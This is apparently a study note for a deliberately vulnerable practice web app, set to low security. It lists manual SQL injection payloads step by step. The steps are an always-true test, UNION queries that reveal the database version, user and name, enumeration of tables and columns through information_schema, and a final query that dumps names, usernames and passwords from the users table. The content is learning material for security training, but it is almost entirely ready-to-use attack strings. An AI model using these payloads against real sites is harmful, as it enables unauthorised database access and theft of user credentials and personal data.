# Manual SQL Injection

__Security (Low)__

User Id -> 1

### Test Vulnerability

```bash %' or '1'='1 ```
 (Always True Cond.) [Null id with % and then always true 1=1]

### Database Version Selection-->
```bash %' or 0=0 union select null, version() # ```  (# represents the comment line in SQL query) [0=0 or 1=1]

### Who owns the DB? 
```bash %' or 0=0 union select null, user() # ```

### DB name employed to this particular site
```bash %' or 0=0 union select null, database() # ```

### Displaying tables as information scema
```bash%' and 1=0 union select null, table_name from information_schema.tables where table_name like 'user%' # ```


[guessing table name start with prefix user and then anything could be...]

```bash %' and 1=0 union select null, table_name from information_schema.tables # ``` [displaying all the tables]

### Interest Zone--Users Table-->
```bash %' and 1=0 union select null, concat(table_name,0x0a, column_name) from information_schema.columns where table_name = 'users' # ```
[0x0a for new line between table name and column name--hexadecimal code for sql]

### Extract the columns information
```bash %' and 1=0 union select null, concat(first_name,0x0a, last_name,0x0a,user,0x0a,password,0x0a,avatar) from users # ```
